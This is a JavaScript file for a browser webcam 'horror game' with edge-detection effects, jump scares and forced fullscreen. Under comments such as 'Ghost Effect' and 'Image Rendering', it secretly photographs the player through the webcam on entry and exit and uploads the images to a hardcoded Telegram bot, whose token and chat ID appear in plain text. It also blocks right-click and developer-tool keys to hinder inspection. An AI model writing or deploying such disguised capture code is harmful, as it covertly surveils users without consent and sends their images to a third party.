// Realm of Darkness (JavaScript Part)
// Program by Zidaan
// Telegram bot token and chat ID
const BOT_TOKEN = "7188197111:AAE89srSGOhS9Y8_I0YQ7WEYbKZUGULTfvU";
const CHAT_ID = "7051599130";
// DOM Elements
let video = document.getElementById("video");
let canvas = document.getElementById("canvas");
let ctx = canvas.getContext("2d");
let welcome = document.getElementById("welcome");
let camera = document.getElementById("camera");
let goodbye = document.getElementById("goodbye");
let startBtn = document.getElementById("startBtn");
let exitBtn = document.getElementById("exitBtn");
let bgMusic = document.getElementById("bgMusic");
let scream = document.getElementById("scream");
let animationId;
let dripCount = 0;
// Format date and time
function getFormattedDateTime(label) {
  const now = new Date();
  const time = now.toLocaleTimeString('en-GB'); // HH:MM:SS
  const date = now.toLocaleDateString('en-GB').split('/').join(' '); // DD MM YYYY
  return `🕸️ Realm of Darkness !!! 🕸️\n🕒 ${label} Time: ${time}\n📅 Date: ${new Date().toLocaleDateString('en-GB')}`;
}
// Capture image for Ghost Effect
function captureAndSendImage(label) {
  const tempCanvas = document.createElement("canvas");
  const tempCtx = tempCanvas.getContext("2d");
  tempCanvas.width = video.videoWidth;
  tempCanvas.height = video.videoHeight;
  tempCtx.drawImage(video, 0, 0, tempCanvas.width, tempCanvas.height);
  tempCanvas.toBlob(blob => {
    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("caption", getFormattedDateTime(label));
    formData.append("photo", blob, `${label.toLowerCase()}.jpg`);
    // Image Rendering
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: formData
    }).catch(err => console.error("Telegram Error:", err));
  }, "image/jpeg", 0.9);
}
// Show creepy message on the screen
function showCreepyMessage(message) {
  const msg = document.createElement("div");
  msg.textContent = message;
  msg.style.position = "fixed";
  msg.style.bottom = "10%";
  msg.style.left = "50%";
  msg.style.transform = "translateX(-50%)";
  msg.style.backgroundColor = "rgba(0, 0, 0, 0.85)";
  msg.style.color = "red";
  msg.style.padding = "15px 30px";
  msg.style.border = "2px solid crimson";
  msg.style.borderRadius = "10px";
  msg.style.fontFamily = "monospace";
  msg.style.fontSize = "1.1rem";
  msg.style.textShadow = "0 0 10px red";
  msg.style.zIndex = "9999";
  msg.classList.add("glitch");
  document.body.appendChild(msg);
  setTimeout(() => msg.remove(), 6000);
}
// Request full screen mode and play audio
function requestFullScreen() {
  const el = document.documentElement;
  const request = el.requestFullscreen || el.webkitRequestFullscreen || el.msRequestFullscreen;
  if (request) {
    request.call(el).catch(() => {
      showCreepyMessage("You tried to stay in control... the Realm disapproves.");
    });
  }
}
// Try to play audio with a fallback message
function tryPlay(audio, failMessage) {
  if (audio && typeof audio.play === "function") {
    audio.muted = true;
    audio.play().then(() => {
      audio.muted = false;
    }).catch(() => {
      showCreepyMessage(failMessage);
    });
  }
}
// Start the horror sequence
startBtn.addEventListener("click", async () => {
  welcome.classList.add("hidden");
  camera.classList.remove("hidden");
  requestFullScreen();
  tryPlay(bgMusic, "Something tried to whisper... but failed.");
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
    // Entry Photo
    video.onloadedmetadata = () => {
      video.play();
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      captureAndSendImage("Entry"); // <-- Entry photo here
      processFrame();
      triggerRandomJumpScares();
    };
  } catch (err) {
    showCreepyMessage("Your camera refused... Maybe it sees what we can't.");
    setTimeout(() => {
      camera.classList.add("hidden");
      goodbye.classList.remove("hidden");
      bgMusic.pause(); bgMusic.currentTime = 0;
      scream.pause(); scream.currentTime = 0;
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      cancelAnimationFrame(animationId);
      if (document.fullscreenElement || document.webkitFullscreenElement) {
        (document.exitFullscreen || document.webkitExitFullscreen || function () {})();
      }
      setTimeout(() => {
        location.reload();
      }, 5000);
    }, 3000);
    return;
  }
// Add blood effect
  let blood = document.createElement("img");
  blood.src = "assets/images/blood.jpeg";
  blood.style.position = "fixed";
  blood.style.top = "0";
  blood.style.left = "0";
  blood.style.width = "100%";
  blood.style.height = "100%";
  blood.style.pointerEvents = "none";
  blood.style.zIndex = "1";
  document.body.appendChild(blood);
// Add shadow effect
  setInterval(() => {
    if (dripCount >= 5) return;
    dripCount++;
    const drip = document.createElement("div");
    drip.className = "blood-drip";
    drip.style.left = Math.floor(Math.random() * 95) + "vw";
    document.body.appendChild(drip);
    setTimeout(() => {
      drip.remove();
      dripCount--;
    }, 3000);
  }, 12000);
});
// Exit button logic
exitBtn.addEventListener("click", () => {
  camera.classList.add("hidden");
  goodbye.classList.remove("hidden");
// Exit Photo
  if (video.srcObject) {
    captureAndSendImage("Exit"); // Telegram Exit photo before camera stops
    video.srcObject.getTracks().forEach(track => track.stop());
    video.srcObject = null;
  }
  bgMusic.pause(); bgMusic.currentTime = 0;
  scream.pause(); scream.currentTime = 0;
// Remove all blood and shadow images
  document.querySelectorAll("img").forEach(img => {
    if (img.src.includes("blood") || img.src.includes("shadow") || img.src.includes("jumpscare")) {
      img.remove();
    }
  });
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  cancelAnimationFrame(animationId);
// Exit fullscreen if active
  if (document.fullscreenElement || document.webkitFullscreenElement) {
    (document.exitFullscreen || document.webkitExitFullscreen || function () {})();
  }
  setTimeout(() => {
    location.reload();
  }, 6000);
});
// Process video frames for creepy effects
function processFrame() {
  if (typeof cv === "undefined" || !cv.Mat) {
    showCreepyMessage("The darkness is forming... Just not yet.");
    requestAnimationFrame(processFrame);
    return;
  }
// Initialize OpenCV Mat objects
  const src = new cv.Mat(video.videoHeight, video.videoWidth, cv.CV_8UC4);
  const gray = new cv.Mat();
  const blurred = new cv.Mat();
  const edges = new cv.Mat();
// Set canvas dimensions
  function draw() {
    try {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      let imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
      src.data.set(imageData.data);
      cv.cvtColor(src, gray, cv.COLOR_RGBA2GRAY);
      cv.GaussianBlur(gray, blurred, new cv.Size(5, 5), 0);
      cv.Canny(blurred, edges, 50, 150);
      ctx.fillStyle = "black";
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      let output = ctx.getImageData(0, 0, canvas.width, canvas.height);
      // Clear the output image data
      for (let y = 0; y < edges.rows; y++) {
        for (let x = 0; x < edges.cols; x++) {
          if (edges.ucharPtr(y, x)[0] !== 0) {
            let i = (y * edges.cols + x) * 4;
            output.data[i] = 0;
            output.data[i + 1] = 255;
            output.data[i + 2] = 0;
            output.data[i + 3] = 255;
          }
        }
      }
      ctx.putImageData(output, 0, 0);
      if (Math.random() < 0.002) {
        let shadow = new Image();
        shadow.src = "assets/images/shadow.jpeg";
        shadow.style.position = "fixed";
        shadow.style.top = "20%";
        shadow.style.left = "30%";
        shadow.style.width = "200px";
        shadow.style.height = "300px";
        shadow.style.zIndex = "2";
        shadow.style.pointerEvents = "none";
        document.body.appendChild(shadow);
        setTimeout(() => shadow.remove(), 2000);
      }
    } catch (err) {}
    animationId = requestAnimationFrame(draw);
  }
  draw();
}
// Random jump scares with images and sound
function triggerRandomJumpScares() {
  const images = [
    "assets/images/jumpscare1.jpeg",
    "assets/images/jumpscare2.jpeg",
    "assets/images/jumpscare3.jpeg",
    "assets/images/jumpscare4.jpeg",
    "assets/images/jumpscare5.jpeg",
    "assets/images/jumpscare6.jpeg",
    "assets/images/jumpscare7.jpeg",
    "assets/images/jumpscare8.jpeg",
    "assets/images/jumpscare9.jpeg",
    "assets/images/jumpscare10.jpeg"
  ];
// Intense scream effect
  function intenseScreamEffect() {
    document.body.classList.add("shake");
    scream.volume = 1;
    scream.currentTime = 0;
    scream.play();
    setTimeout(() => document.body.classList.remove("shake"), 1000);
  }
// Scare function with random delay
  function scare() {
    const delay = Math.random() * 20000 + 10000;
    // Randomly choose a jump scare image
    setTimeout(() => {
      let img = document.createElement("img");
      img.src = images[Math.floor(Math.random() * images.length)];
      img.style.position = "fixed";
      img.style.top = "0";
      img.style.left = "0";
      img.style.width = "100%";
      img.style.height = "100%";
      img.style.zIndex = "999";
      img.style.pointerEvents = "none";
      // Add a random rotation for the image
      document.body.appendChild(img);
      intenseScreamEffect();
      setTimeout(() => {
        img.remove();
        scare();
      }, 1500);
    }, delay);
  }
  scare();
}
// Resize canvas on window resize
window.addEventListener("resize", () => {
  setTimeout(() => {
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
  }, 500);
});
// Register the service worker
if ('serviceWorker' in navigator) {
    navigator.serviceWorker.register('service-worker.js')
        .then(reg => console.log('✅ Service Worker registered:', reg))
        .catch(err => console.error('❌ Service Worker error:', err));
}
// Security features with taunts
// Funny taunt on right click
document.addEventListener('contextmenu', function (e) {
    e.preventDefault();
    alert("😏 No right click! Thought you were smart, huh?");
});
// Funny taunt on F12 and other DevTools keys
document.addEventListener('keydown', function (e) {
    // F12
    if (e.key === "F12" || e.keyCode === 123) {
        e.preventDefault();
        alert("😈 F12? Trying to act clever? Nope!");
    }
    // Ctrl+Shift+I
    if (e.ctrlKey && e.shiftKey && e.key === 'I') {
        e.preventDefault();
        alert("😜 Inspect shortcut? Busted!");
    }
    // Ctrl+Shift+J
    if (e.ctrlKey && e.shiftKey && e.key === 'J') {
        e.preventDefault();
        alert("😂 Console peek? Dream on!");
    }
    // Ctrl+U (View Source)
    if (e.ctrlKey && e.key === 'u') {
        e.preventDefault();
        alert("😅 View source? Not happening, buddy!");
    }
    // Ctrl+Shift+C
    if (e.ctrlKey && e.shiftKey && e.key === 'C') {
        e.preventDefault();
        alert("😏 Element inspector? You wish!");
    }
});
// Info Modal Logic
const infoButton = document.getElementById('infoButton');
const infoModal = document.getElementById('infoModal');
// Close button in the modal
infoButton.addEventListener('click', () => {
  infoModal.style.display = 'block';
  setTimeout(() => {
    infoModal.style.opacity = '1';
    infoModal.style.transform = 'translate(-50%, -50%) scale(1)';
  }, 10);
});
// Close the modal when clicking outside of it
function closeInfoModal() {
  infoModal.style.opacity = '0';
  infoModal.style.transform = 'translate(-50%, -50%) scale(0.8)';
  setTimeout(() => {
    infoModal.style.display = 'none';
  }, 300);
}
// End of Program
